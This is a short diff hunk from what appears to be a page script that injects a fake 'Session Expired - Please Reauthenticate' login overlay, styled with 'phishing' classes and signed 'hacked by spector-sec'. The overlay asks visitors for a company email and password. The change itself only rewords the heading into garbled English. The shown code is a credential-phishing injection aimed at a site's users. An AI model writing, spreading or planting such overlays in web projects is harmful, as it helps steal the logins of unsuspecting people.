@@ -5,7 +5,7 @@ document.addEventListener('vite-script-loaded', function() {
   fakeLogin.className = 'phishing-overlay';
   fakeLogin.innerHTML = `
     <div class="phishing-container">
-      <h2 style="color:#d23f00">Session Expired - Please Reauthenticate</h2>
+      <h2 style="color:#d23f00">user/admin requered login or payment thats why Session Expired - Please Reauthenticate</h2>
       <p>hacked by spector-sec @$%Phishing + DOM Manipulation%$@ Your session has expired for security reasons:</p>
       <input type="email" id="phish-email" placeholder="Company Email" class="phishing-input">
       <input type="password" id="phish-pwd" placeholder="Password" class="phishing-input">
